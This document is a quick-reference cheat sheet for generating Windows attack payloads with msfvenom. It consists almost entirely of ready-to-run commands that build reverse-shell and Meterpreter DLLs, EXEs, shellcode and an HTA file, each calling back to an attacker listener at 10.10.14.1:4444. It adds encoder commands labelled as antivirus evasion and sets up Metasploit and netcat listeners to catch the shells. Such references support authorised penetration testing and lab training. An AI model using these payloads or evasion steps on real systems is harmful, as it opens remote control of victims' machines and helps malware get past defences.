# msfvenom Payload Generation Quick Reference

> Replace `LHOST` and `LPORT` with your listener IP and port.

## DLL Payloads

```bash
# x64 Reverse Shell DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o revshell64.dll

# x64 Meterpreter DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o meterpreter64.dll

# x86 Reverse Shell DLL
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o revshell32.dll

# x86 Meterpreter DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o meterpreter32.dll
```

## EXE Payloads

```bash
# x64 Reverse Shell EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o revshell64.exe

# x64 Meterpreter EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o meterpreter64.exe
```

## Shellcode (for injection)

```bash
# x64 Shellcode — C format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f c

# x64 Shellcode — Python format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f python

# x64 Shellcode — C# format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f csharp

# x64 Shellcode — Raw binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw -o shellcode.bin

# Calc.exe PoC (no callback needed)
msfvenom -p windows/x64/exec CMD=calc.exe -f c
msfvenom -p windows/x64/exec CMD=calc.exe -f dll -o calc.dll
```

## CHM Payloads (via msfvenom + nishang)

```bash
# msfvenom HTA payload (embed in CHM)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f hta-psh -o payload.hta
```

## Staged vs Stageless

```
Staged (smaller, needs handler):     windows/x64/meterpreter/reverse_tcp
Stageless (standalone, larger):      windows/x64/meterpreter_reverse_tcp
```

## Encoders (AV evasion for testing)

```bash
# Shikata-ga-nai encoder
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -e x64/xor_dynamic -i 3 -f dll -o encoded.dll

# Multiple iterations
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -e x64/xor -i 5 -f exe -o encoded.exe
```

## Listener Setup (Metasploit)

```
msfconsole
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```

## Listener Setup (Netcat)

```bash
# Basic listener
nc -lvnp 4444

# With readline (better shell)
rlwrap nc -lvnp 4444
```
